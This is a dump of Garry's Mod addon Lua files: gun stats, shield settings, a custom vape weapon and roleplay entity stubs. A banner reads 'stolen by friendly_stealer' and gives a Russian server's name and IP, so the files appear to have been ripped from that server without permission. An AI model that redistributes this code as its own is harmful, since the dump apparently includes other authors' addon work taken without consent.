SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true

SWEP.Primary.Sound			= Sound("Weapon_HoneyB.single")		-- script that calls the primary fire sound
SWEP.Primary.RPM				= 800		-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 30		-- Size of a clip
SWEP.Primary.DefaultClip			= 60	-- Bullets you start with
SWEP.Primary.KickUp			= .15				-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= .1			-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal			= .1		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= true		-- Automatic/Semi Auto
SWEP.Primary.Ammo			= "Rifle"	-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.SelectiveFire		= true

SWEP.Secondary.ScopeZoom			= 3.5	
SWEP.Secondary.UseACOG			= false -- Choose one scope type
SWEP.Secondary.UseMilDot		= false	-- I mean it, only one	
SWEP.Secondary.UseSVD			= false	-- If you choose more than one, your scope will not show up at all
SWEP.Secondary.UseParabolic		= false	
SWEP.Secondary.UseElcan			= false
SWEP.Secondary.UseGreenDuplex	= false
SWEP.Secondary.UseAimpoint		= true

SWEP.data 				= {}
SWEP.data.ironsights			= 1
SWEP.ScopeScale 			= 0.7

SWEP.Primary.NumShots	= 1		--how many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 22	--base damage per bullet
SWEP.Primary.Spread		= .001	--define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .001 -- ironsight accuracy, should be the same for shotguns

-- enter iron sight info and bone mod info below

SWEP.IronSightsPos = Vector(-3.096, -3.695, 0.815)
SWEP.IronSightsAng = Vector(0.039, 0, 0)
SWEP.SightsPos = Vector(-3.096, -3.695, 0.815)
SWEP.SightsAng = Vector(0.039, 0, 0)
SWEP.RunSightsPos = Vector(4.094, -2.454, -0.618)
SWEP.RunSightsAng = Vector(-8.957, 53.188, -9.195)

SWEP.WElements = {
	["lense"] = { type = "Model", model = "models/XQM/panel360.mdl", bone = "ValveBiped.Bip01_R_Hand", rel = "", pos = Vector(4.671, 0.832, -8.141), angle = Angle(0, 0, 0), size = Vector(0.039, 0.039, 0.039), color = Color(255, 255, 255, 255), surpresslightning = false, material = "models/wystan/attachments/aimpoint/lense", skin = 0, bodygroup = {} },
	["scope"] = { type = "Model", model = "models/wystan/attachments/aimpoint.mdl", bone = "ValveBiped.Bip01_R_Hand", rel = "", pos = Vector(-2.543, 0.463, 1.733), angle = Angle(-180, 90, 0), size = Vector(1.45,1.45,1.45), color = Color(255, 255, 255, 255), surpresslightning = false, material = "", skin = 0, bodygroup = {} },
	["lense+"] = { type = "Model", model = "models/XQM/panel360.mdl", bone = "ValveBiped.Bip01_R_Hand", rel = "", pos = Vector(10.041, 0.832, -8.1), angle = Angle(0, 0, 0), size = Vector(0.039, 0.039, 0.039), color = Color(255, 255, 255, 255), surpresslightning = false, material = "models/wystan/attachments/aimpoint/lense", skin = 0, bodygroup = {} }
}

SWEP.VElements = {
	["aimpoint"] = { type = "Model", model = "models/wystan/attachments/aimpoint.mdl", bone = "Gun", rel = "", pos = Vector(0.228, 7.487, -4.416), angle = Angle(0, 180, 0), size = Vector(1, 1, 1), color = Color(255, 255, 255, 255), surpresslightning = false, material = "", skin = 0, bodygroup = {} },
	["lense"] = { type = "Model", model = "models/XQM/panel360.mdl", bone = "Gun", rel = "aimpoint", pos = Vector(0.298, 4.546, 6.756), angle = Angle(0, 90, 38.293), size = Vector(0.024, 0.024, 0.024), color = Color(255, 255, 255, 255), surpresslightning = false, material = "models/wystan/attachments/aimpoint/lense", skin = 0, bodygroup = {} }
}


if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/m9k/lua/weapons/m9k_l85/shared.lua:
--[[
Server Name: Русский FastRP #1 [Быстрая загрузка][M9K]
Server IP:   37.230.137.126:27015
File Path:   addons/rp_wep/lua/weapons/m9k_l85/shared.lua
		 __        __              __             ____     _                ____                __             __         
   _____/ /_____  / /__  ____     / /_  __  __   / __/____(_)__  ____  ____/ / /_  __     _____/ /____  ____ _/ /__  _____
  / ___/ __/ __ \/ / _ \/ __ \   / __ \/ / / /  / /_/ ___/ / _ \/ __ \/ __  / / / / /    / ___/ __/ _ \/ __ `/ / _ \/ ___/
 (__  ) /_/ /_/ / /  __/ / / /  / /_/ / /_/ /  / __/ /  / /  __/ / / / /_/ / / /_/ /    (__  ) /_/  __/ /_/ / /  __/ /    
/____/\__/\____/_/\___/_/ /_/  /_.___/\__, /  /_/ /_/  /_/\___/_/ /_/\__,_/_/\__, /____/____/\__/\___/\__,_/_/\___/_/     
                                     /____/                                 /____/_____/                                  
--]]

-- Variables that are used on both client and server
SWEP.Gun = ("m9k_l85") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then 
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Assault Rifles"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "L85"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 2				-- Slot in the weapon selection menu
SWEP.SlotPos				= 32			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- Set false if you want no crosshair from hip
SWEP.Weight				= 50			-- Rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.XHair					= true		-- Used for returning crosshair after scope. Must be the same as DrawCrosshair
SWEP.BoltAction				= false		-- Is this a bolt action rifle?
SWEP.HoldType 				= "ar2"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_rif_l85.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_l85a2.mdl"	-- Weapon world model
SWEP.Base 				= "bobs_scoped_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true

SWEP.Primary.Sound			= Sound("Weapon_l85.Single")		-- script that calls the primary fire sound
SWEP.Primary.RPM				= 750		-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 30		-- Size of a clip
SWEP.Primary.DefaultClip			= 60	-- Bullets you start with
SWEP.Primary.KickUp				= .2				-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= .2			-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= .3		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= true		-- Automatic/Semi Auto
SWEP.Primary.Ammo			= "Rifle"	-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.SelectiveFire		= true

SWEP.Secondary.ScopeZoom			= 4	
SWEP.Secondary.UseACOG			= true -- Choose one scope type
SWEP.Secondary.UseMilDot		= false	-- I mean it, only one	
SWEP.Secondary.UseSVD			= false	-- If you choose more than one, your scope will not show up at all
SWEP.Secondary.UseParabolic		= false	
SWEP.Secondary.UseElcan			= false
SWEP.Secondary.UseGreenDuplex	= false	
SWEP.Secondary.UseAimpoint		= false
SWEP.Secondary.UseMatador		= false

SWEP.data 				= {}
SWEP.data.ironsights		= 1
SWEP.ScopeScale 			= 0.5
SWEP.ReticleScale 			= 0.6

SWEP.Primary.NumShots	= 1		--how many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 20	--base damage per bullet
SWEP.Primary.Spread		= .001	--define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .001 -- ironsight accuracy, should be the same for shotguns

-- enter iron sight info and bone mod info below

SWEP.IronSightsPos = Vector (2.275, -2.9708, 0.5303)
SWEP.IronSightsAng = Vector (0, 0, 0)
SWEP.SightsPos = Vector (2.275, -2.9708, 0.5303)
SWEP.SightsAng = Vector (0, 0, 0)
SWEP.RunSightsPos = Vector (-3.0328, 0, 1.888)
SWEP.RunSightsAng = Vector (-24.2146, -36.522, 10)

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/weaponandcontent/lua/weapons/p228/shared.lua:
AddCSLuaFile()

if CLIENT then
	SWEP.DrawCrosshair = true
	SWEP.PrintName = "P228"
	SWEP.CSMuzzleFlashes = true
	
	SWEP.AimPos = Vector(2.519, 2.793, 1.399)
	SWEP.AimAng = Vector(0.115, 0.083, 0)
		
	SWEP.SprintPos = Vector(-2.437, -6.748, -5.019)
	SWEP.SprintAng = Vector(59.777, 0, 0)
	
	SWEP.ZoomAmount = 5
	SWEP.ViewModelMovementScale = 0.85
	SWEP.Shell = "smallshell"
	
	SWEP.IconLetter = "c"
	--killicon.AddFont("swb_p228", "SWB_KillIcons", SWEP.IconLetter, Color(255, 80, 0, 150))
	
	SWEP.MuzzleEffect = "swb_pistol_small"
end
SWEP.CanPenetrate = false
SWEP.PlayBackRate = 30
SWEP.PlayBackRateSV = 12
SWEP.SpeedDec = 10
SWEP.BulletDiameter = 9
SWEP.CaseLength = 19

SWEP.Kind = WEAPON_PISTOL
SWEP.AutoSpawnable = true
SWEP.AllowDrop = true
SWEP.AmmoEnt = "item_ammo_pistol_ttt"

SWEP.Slot = 1
SWEP.SlotPos = 0
SWEP.NormalHoldType = "Pistol"
SWEP.RunHoldType = "normal"
SWEP.FireModes = {"semi"}
SWEP.Base = "swb_base"
SWEP.Category = "Weapons"

SWEP.Author			= "Base swb"
SWEP.Contact		= ""
SWEP.Purpose		= ""
SWEP.Instructions	= ""

SWEP.ViewModelFOV	= 70
SWEP.ViewModelFlip	= true
SWEP.ViewModel				= "models/weapons/2_pist_p228.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_pist_p228.mdl"	-- Weapon world model

SWEP.Spawnable			= true
SWEP.AdminSpawnable		= true

SWEP.Primary.ClipSize		= 15
SWEP.Primary.DefaultClip	= 15
SWEP.Primary.Automatic		= false
SWEP.Primary.Ammo			= "Pistol"

SWEP.FireDelay = 0.013
SWEP.FireSound = Sound("Alt_Weapon_P228.1")	
SWEP.Recoil = 0.3

SWEP.HipSpread = 0.036
SWEP.AimSpread = 0.0115
SWEP.VelocitySensitivity = 0
SWEP.MaxSpreadInc = 0
SWEP.SpreadPerShot = 0
SWEP.SpreadCooldown = 0
SWEP.Shots = 1
SWEP.Damage = 19
SWEP.DeployTime = 1
--PATH addons/cp_ballistic_shields/lua/bs_config.lua:
include( "ballistic_shields/sh_bs_util.lua" )

--------------------- BALLISTIC SHIELDS V1.1.9 -------------------------

---- CONFIG ----
-- AVALAIBLE LANGUAGES - English, German, French, Danish, Turkish
bshields.config.language = "English"
-- DISABLE HUD
bshields.config.disablehud = true
-- MINIMUM RIOT SHIELD DAMAGE
bshields.config.rshielddmgmin = 8
-- MAXIMUM RIOT SHIELD DAMAGE
bshields.config.rshielddmgmax = 16
-- HEAVY SHIELD EXPLOSION DAMAGE REDUCITON (IN %)
bshields.config.hshieldexpl = 100
-- HEAVY SHIELD MELEE DAMAGE REDUCTION (IN %)
bshields.config.hshieldmelee = 100
-- RIOT SHIELD MELEE DAMAGE REDUCTION (IN %)
bshields.config.rshieldmelee = 100
-- HEAVY SHIELD BREACH COOLDOWN (IN SECONDS)
bshields.config.hshieldcd = 20
-- DOOR RESPAWN TIMER (IN SECONDS)
bshields.config.doorrespawn = 60
-- MAXIMUM AMOUNT OF DEPLOYED SHIELDS
bshields.config.maxshields = 3
-- SHOULD FADING DOORS BE BREACHABLE?
bshields.config.breachfdoors = false
-- ALLOW BREACHING UNOWNED DOORS
bshields.config.breachudoors = false
-- REMOVE DEPLOYED SHIELDS ON JOB CHANGE
bshields.config.removeonjobchange = true

-------- CUSTOM TEXTURES, LEAVE "" FOR DEFAULT "POLICE" TEXT. ----------
--- FOR EDITING USE THE 256x256 TEMPLATE INCLUDED IN THE MAIN FOLDER ---

-- HEAVY SHIELD
bshields.config.hShieldTexture = ""
-- RIOT SHIELD
bshields.config.rShieldTexture = ""
-- DEPLOYABLE SHIELD
bshields.config.dShieldTexture = "" 
-- PLAYERS MIGHT HAVE TO RECONNECT IN ORDER TO SEE THE NEW TEXTURES! ---

-- [CW2 ONLY] YOU NEED THIS ADDON: https://steamcommunity.com/sharedfiles/filedetails/?id=1771994451
-- SHOULD RIOT SHIELD BE BULLETPROOF? --
bshields.config.rshieldbp = false
--PATH addons/weaponandcontent/lua/weapons/scout/shared.lua:
AddCSLuaFile()

if CLIENT then
	SWEP.DrawCrosshair = true
	SWEP.PrintName = "Scout"
	SWEP.CSMuzzleFlashes = true
	
	SWEP.AimPos =  Vector(3.319, 0, 1.559)
	SWEP.AimAng = Vector(0, 0, 0)
		
	SWEP.SprintPos = Vector(-7.165, -10.157, 2.756)
	SWEP.SprintAng = Vector(-19.017, -70, 0)
	
	SWEP.ViewModelMovementScale = 1.15
	
	SWEP.DrawBlackBarsOnAim = true
	SWEP.AimOverlay = surface.GetTextureID("swb/scope_rifle")
	SWEP.FadeDuringAiming = true
	SWEP.MoveWepAwayWhenAiming = true
	SWEP.ZoomAmount = 70
	SWEP.DelayedZoom = true
	SWEP.SnapZoom = true
	SWEP.SimulateCenterMuzzle = true
	
	SWEP.AdjustableZoom = true
	SWEP.MinZoom = 40
	SWEP.MaxZoom = 80
	
	SWEP.IconLetter = "n"
	--killicon.AddFont("swb_scout", "SWB_KillIcons", SWEP.IconLetter, Color(255, 80, 0, 150))
	
	SWEP.MuzzleEffect = "swb_rifle_large"
end

SWEP.PlayBackRate = 1
SWEP.PlayBackRateSV = 1
SWEP.FadeCrosshairOnAim = true
SWEP.PreventQuickScoping = true

SWEP.Kind = WEAPON_HEAVY
SWEP.AutoSpawnable = true
SWEP.AllowDrop = true

SWEP.SpeedDec = 25
SWEP.BulletDiameter = 7.62
SWEP.CaseLength = 51

SWEP.Slot = 4
SWEP.SlotPos = 0
SWEP.NormalHoldType = "ar2"
SWEP.RunHoldType = "passive"
SWEP.FireModes = {"bolt"}
SWEP.Base = "swb_base"
SWEP.Category = "Weapons"

SWEP.Author			= "Base swb"
SWEP.Contact		= ""
SWEP.Purpose		= ""
SWEP.Instructions	= ""

SWEP.ViewModelFOV	= 70
SWEP.ViewModelFlip	= true
SWEP.ViewModel				= "models/weapons/2_snip_scout.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_snip_scout.mdl"	-- Weapon world model

SWEP.Spawnable			= true
SWEP.AdminSpawnable		= true

SWEP.Primary.ClipSize		= 10
SWEP.Primary.DefaultClip	= 10
SWEP.Primary.Automatic		= false
SWEP.Primary.Ammo			= "ar2"

SWEP.FireDelay = 1.3
SWEP.FireSound = Sound("Alt_Weapon_Scout.1")
SWEP.Recoil = 2

SWEP.HipSpread = 0.055
SWEP.AimSpread = 0.00015
SWEP.VelocitySensitivity = 0
SWEP.MaxSpreadInc = 0
SWEP.SpreadPerShot = 0
SWEP.SpreadCooldown = 0
SWEP.Shots = 1
SWEP.Damage = 50
SWEP.DeployTime = 1
--PATH addons/weaponandcontent/lua/weapons/sg552/shared.lua:
AddCSLuaFile()

if CLIENT then
	SWEP.DrawCrosshair = true
	SWEP.PrintName = "SG552"
	SWEP.CSMuzzleFlashes = true
	
	SWEP.AimPos =  Vector(3.4, 0, 1.039)
	SWEP.AimAng = Vector(0, 0, 0)
		
	SWEP.SprintPos = Vector(-3.543, -4.419, -0.241)
	SWEP.SprintAng = Vector(-12.954, -58.151, 10.748)
	
	SWEP.ViewModelMovementScale = 1.15
	
	SWEP.DrawBlackBarsOnAim = true
	SWEP.AimOverlay = surface.GetTextureID("swb/scope_rifle")
	SWEP.FadeDuringAiming = true
	SWEP.MoveWepAwayWhenAiming = true
	SWEP.ZoomAmount = 50
	SWEP.DelayedZoom = true
	SWEP.SnapZoom = true
	SWEP.SimulateCenterMuzzle = true
	
	SWEP.IconLetter = "A"
	--killicon.AddFont("swb_sg552", "SWB_KillIcons", SWEP.IconLetter, Color(255, 80, 0, 150))
	
	SWEP.MuzzleEffect = "swb_rifle_med"
end

SWEP.PlayBackRate = 1
SWEP.PlayBackRateSV = 1
SWEP.FadeCrosshairOnAim = true
SWEP.PreventQuickScoping = true

SWEP.Kind = WEAPON_HEAVY
SWEP.AutoSpawnable = true
SWEP.AllowDrop = true

SWEP.SpeedDec = 20
SWEP.BulletDiameter = 5.56
SWEP.CaseLength = 45

SWEP.Slot = 4
SWEP.SlotPos = 0
SWEP.NormalHoldType = "ar2"
SWEP.RunHoldType = "passive"
SWEP.FireModes = {"auto", "semi"}
SWEP.Base = "swb_base"
SWEP.Category = "Weapons"

SWEP.Author			= "Base swb"
SWEP.Contact		= ""
SWEP.Purpose		= ""
SWEP.Instructions	= ""

SWEP.ViewModelFOV	= 70
SWEP.ViewModelFlip	= true
SWEP.ViewModel				= "models/weapons/2_rif_sg552.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_rif_sg552.mdl"	-- Weapon world model

SWEP.Spawnable			= true
SWEP.AdminSpawnable		= true

SWEP.Primary.ClipSize		= 30
SWEP.Primary.DefaultClip	= 30
SWEP.Primary.Automatic		= true
SWEP.Primary.Ammo			= "ar2"

SWEP.FireDelay = 0.0857
SWEP.FireSound = Sound("Alt_Weapon_SG552.1")
SWEP.Recoil = 0.4

SWEP.HipSpread = 0.042
SWEP.AimSpread = 0.006
SWEP.VelocitySensitivity = 0
SWEP.MaxSpreadInc = 0
SWEP.SpreadPerShot = 0
SWEP.SpreadCooldown = 0
SWEP.Shots = 1
SWEP.Damage = 23
SWEP.DeployTime = 1
--PATH addons/vapeswep/lua/weapons/weapon_vape_custom.lua:
-- weapon_vape_custom.lua
-- Defines a vape with changeable accent color

-- Vape SWEP by Swamp Onions - http://steamcommunity.com/id/swamponions/

if CLIENT then
	include('weapon_vape/cl_init.lua')
else
	include('weapon_vape/shared.lua')
end

SWEP.PrintName = "Custom Vape"

SWEP.Instructions = "LMB: Rip Fat Clouds\n (Hold and release)\nRMB: Customize\nReload: Play Sound\n\nBuild the perfect vape for the perfect rip."

SWEP.VapeAccentColor = Vector(-1,-1,-1)

function SWEP:SecondaryAttack()
	if SERVER then
		self.Owner:SendLua("CustomVapeOpenPanel()")
	end
end

if CLIENT then

	CreateConVar( "cl_vapecolor", "0.35 0 1.0", FCVAR_ARCHIVE, "The value is a Vector - so between 0-1 - not between 0-255" )

	function SWEP:OwnerChanged()
		if self.Owner == LocalPlayer() then
			self.Owner.CustomVapeColor = Vector(GetConVar("cl_vapecolor"):GetString())
			net.Start("VapeUpdateCustomColor")
			net.WriteVector(self.Owner.CustomVapeColor)
			net.SendToServer()
		end
	end

	CustomVapeFrame = nil

	function CustomVapeOpenPanel()
		if IsValid(CustomVapeFrame) then return end

		local Frame = vgui.Create( "DFrame" )
		Frame:SetSize( 320, 240 ) --good size for example
		Frame:SetTitle( "Building the perfect vape for the perfect rip" )
		Frame:Center()
		Frame:MakePopup()

		local Mixer = vgui.Create( "DColorMixer", Frame )
		Mixer:Dock( FILL )
		Mixer:SetPalette( true )
		Mixer:SetAlphaBar(false) 
		Mixer:SetWangs( true )
		Mixer:SetVector(Vector(GetConVarString("cl_vapecolor")))
		Mixer:DockPadding(0,0,0,40)

		local DButton = vgui.Create( "DButton", Frame )
		DButton:SetPos( 128, 200 )
		DButton:SetText( "Build!" )
		DButton:SetSize( 64, 32 )
		DButton.DoClick = function()
			surface.PlaySound("weapons/smg1/switch_single.wav")
			local cvec = Mixer:GetVector()
			RunConsoleCommand('cl_vapecolor',tostring(cvec))
			Frame:Remove()
			timer.Simple(0.1, function()
				net.Start("VapeUpdateCustomColor")
				net.WriteVector(cvec)
				net.SendToServer()
			end)
		end

		CustomVapeFrame = Frame

	end

	net.Receive("VapeUpdateCustomColor", function(len)
		local ply = net.ReadEntity()
		local vec = net.ReadVector()
		if IsValid(ply) then ply.CustomVapeColor = vec end
	end)

else
	util.AddNetworkString("VapeUpdateCustomColor")
	net.Receive("VapeUpdateCustomColor", function(len, ply)
		if !ply:HasWeapon("weapon_vape_custom") then return end
		if ((ply.LastCustomVapeColorChange or 0) + 1) > CurTime() then return end
		ply.LastCustomVapeColorChange = CurTime()
		local vec = net.ReadVector()
		net.Start("VapeUpdateCustomColor")
		net.WriteEntity(ply)
		net.WriteVector(vec)
		net.Broadcast()
	end)
end
--PATH addons/zeros_weedfarm/lua/weapons/zwf_bong01.lua:
AddCSLuaFile()
DEFINE_BASECLASS("zwf_bong")

SWEP.Base = "zwf_bong"
SWEP.PrintName = "Cherry Bowl"
SWEP.Category = "Zeros GrowOP"
SWEP.ViewModelFOV = 90
SWEP.ViewModel = "models/zerochain/props_weedfarm/zwf_bong01_vm.mdl"
SWEP.WorldModel = "models/zerochain/props_weedfarm/zwf_bong01_vm.mdl"
SWEP.AdminSpawnable = true
SWEP.Spawnable = true

SWEP.BongID = 1

if CLIENT then
	SWEP.WepSelectIcon = surface.GetTextureID("zerochain/zwf/vgui/zwf_swep_bong01")
end

function SWEP:SetupDataTables()


    self:NetworkVar("Int", 1, "WeedID")
    self:NetworkVar("String", 0, "Weed_Name")
    self:NetworkVar("Int", 2, "Weed_THC")
    self:NetworkVar("Int", 3, "Weed_Amount")
    self:NetworkVar("Bool", 0, "IsBusy")
    self:NetworkVar("Bool", 1, "IsSmoking")
    self:NetworkVar("Bool", 2, "IsBurning")

    if (SERVER) then
        self:SetWeedID(-1)
        self:SetWeed_THC(-1)
        self:SetIsBusy(false)
        self:SetWeed_Name("NILL")
        self:SetWeed_Amount(0)
        self:SetIsSmoking(false)

        self:SetIsBurning(false)
    end
end

--PATH addons/zeros_weedfarm/lua/weapons/zwf_bong02.lua:
AddCSLuaFile()
DEFINE_BASECLASS("zwf_bong")

SWEP.Base = "zwf_bong"
SWEP.PrintName = "Reggae Dream"
SWEP.Category = "Zeros GrowOP"
SWEP.ViewModelFOV = 90
SWEP.ViewModel = "models/zerochain/props_weedfarm/zwf_bong02_vm.mdl"
SWEP.WorldModel = "models/zerochain/props_weedfarm/zwf_bong02_vm.mdl"
SWEP.AdminSpawnable = true
SWEP.Spawnable = true

SWEP.BongID = 2

if CLIENT then
	SWEP.WepSelectIcon = surface.GetTextureID("zerochain/zwf/vgui/zwf_swep_bong02")
end

function SWEP:SetupDataTables()
    self:NetworkVar("Int", 1, "WeedID")
    self:NetworkVar("String", 0, "Weed_Name")
    self:NetworkVar("Int", 2, "Weed_THC")
    self:NetworkVar("Int", 3, "Weed_Amount")
    self:NetworkVar("Bool", 0, "IsBusy")
    self:NetworkVar("Bool", 1, "IsSmoking")
    self:NetworkVar("Bool", 2, "IsBurning")

    if (SERVER) then
        self:SetWeedID(-1)
        self:SetWeed_THC(-1)
        self:SetIsBusy(false)
        self:SetWeed_Name("NILL")
        self:SetWeed_Amount(0)
        self:SetIsSmoking(false)

        self:SetIsBurning(false)
    end
end

--PATH addons/zeros_weedfarm/lua/weapons/zwf_shoptablet/shared.lua:
SWEP.PrintName = "Планшет" // The name of your SWEP
SWEP.Author = "ZeroChain" // Your name
SWEP.Instructions = "RMB: Opens the Shop | Reload: Sell Equipment" // How do people use your SWEP?
SWEP.Contact = "https://www.gmodstore.com/users/ZeroChain" // How people should contact you if they find bugs, errors, etc
SWEP.Purpose = "Used to acess the shop and buy equipment." // What is the purpose of the SWEP?
SWEP.AdminSpawnable = true // Is the SWEP spawnable for admins?
SWEP.Spawnable = true // Can everybody spawn this SWEP? - If you want only admins to spawn it, keep this false and admin spawnable true.
SWEP.ViewModelFOV = 100 // How much of the weapon do you see?

SWEP.ViewModel = "models/zerochain/props_weedfarm/zwf_tablet_vm.mdl"
SWEP.WorldModel =  "models/zerochain/props_weedfarm/zwf_tablet_vm.mdl"

if CLIENT then
	SWEP.WepSelectIcon = surface.GetTextureID("zerochain/zwf/vgui/zwf_swep_tablet")
end

SWEP.AutoSwitchTo = true // When someone picks up the SWEP, should it automatically change to your SWEP?
SWEP.AutoSwitchFrom = false // Should the weapon change to the a different SWEP if another SWEP is picked up?
SWEP.Slot = 3 // Which weapon slot you want your SWEP to be in? (1 2 3 4 5 6)
SWEP.SlotPos = 3 // Which part of that slot do you want the SWEP to be in? (1 2 3 4 5 6)
SWEP.HoldType = "normal" // How is the SWEP held? (Pistol SMG Grenade Melee)
SWEP.FiresUnderwater = false // Does your SWEP fire under water?
SWEP.Weight = 5 // Set the weight of your SWEP.
SWEP.DrawCrosshair = true // Do you want the SWEP to have a crosshair?
SWEP.Category = "Zeros GrowOP"
SWEP.DrawAmmo = false // Does the ammo show up when you are using it? True / False
SWEP.base = "weapon_base" //What your weapon is based on.
SWEP.Primary.ClipSize = -1
SWEP.Primary.DefaultClip = -1
SWEP.Primary.Automatic = true
SWEP.Primary.Ammo = "none"
SWEP.Primary.Recoil = 1
SWEP.Primary.Delay = 0.5
SWEP.Secondary.ClipSize = -1
SWEP.Secondary.DefaultClip = -1
SWEP.Secondary.Automatic = false
SWEP.Secondary.Ammo = "none"
SWEP.Secondary.Recoil = 1
SWEP.Secondary.Delay = 0.5
SWEP.UseHands = true

--PATH addons/foodmode/lua/entities/base_food/cl_init.lua:
include("shared.lua") 
surface.CreateFont("foodFont", {
	font = "roboto",
	size = 34,
	weight = 800,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false,
});
function ENT:Draw()
	self:DrawModel()
	
	local pos = self:GetPos()
	local ang = self:GetAngles()
	
	ang:RotateAroundAxis(ang:Up(), 90);
	ang:RotateAroundAxis(ang:Forward(), 90);
	if (LocalPlayer():GetPos():Distance(self:GetPos()) < 200 or LocalPlayer():GetEyeTrace().Entity == self) then
		cam.Start3D2D(pos + ang:Up(), Angle(0, LocalPlayer():EyeAngles().y-90, 90), 0.15);
			draw.SimpleTextOutlined(self:GetDTString(0) or 'Неизвестно', "foodFont", 0, -80, Color(255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 0, Color(25, 25, 25, 100));
		cam.End3D2D();
	end
end;
--PATH addons/mod_bitminers2/lua/entities/bm2_fuel/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"

ENT.PrintName = "Fuel"
ENT.Spawnable = true
ENT.Category = "Bitminers 2"

function ENT:SetupDataTables()
	self:NetworkVar("Entity", 0, "owning_ent")
end
--PATH addons/mod_bitminers2/lua/entities/bm2_power_lead/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"

ENT.PrintName = "Power Lead"
ENT.Spawnable = true
ENT.Category = "Bitminers 2"

function ENT:SetupDataTables()
	self:NetworkVar("Entity", 0, "owning_ent")
end
--PATH addons/cp_ballistic_shields/lua/entities/bs_dshield/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"
ENT.PrintName = "Deployable shield"
ENT.Category = "Ballistic shields"

ENT.Spawnable = false
ENT.DisableDuplicator = true

--PATH addons/cp_ballistic_shields/lua/entities/bs_hshield/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"
ENT.PrintName = "Heavy shield"
ENT.Category = "Ballistic shields"

ENT.Spawnable = false
ENT.DisableDuplicator = true

--PATH addons/cp_ballistic_shields/lua/entities/bs_rshield/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"
ENT.PrintName = "Riot shield"
ENT.Category = "Ballistic shields"

ENT.Spawnable = false
ENT.DisableDuplicator = true

--PATH addons/the_cocaine_factory/lua/entities/cocaine_box/cl_init.lua:
include("shared.lua")

function ENT:Draw()	
	self:DrawModel()	
end
--PATH addons/the_cocaine_factory/lua/entities/cocaine_bucket/cl_init.lua:
include( "shared.lua" )

function ENT:Draw()
	self:DrawModel()	
end
--PATH addons/the_cocaine_factory/lua/entities/cocaine_bucket/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"
ENT.PrintName = "Bucket"
ENT.Author = "Crap-Head"
ENT.Category = "The Cocaine Factory"
ENT.Spawnable = true
ENT.AdminSpawnable = true

function ENT:SetupDataTables()	
	self:NetworkVar( "Int", 0, "HP" )
	
	self:NetworkVar( "Entity", 0, "owning_ent" ) -- darkrp owner support
end
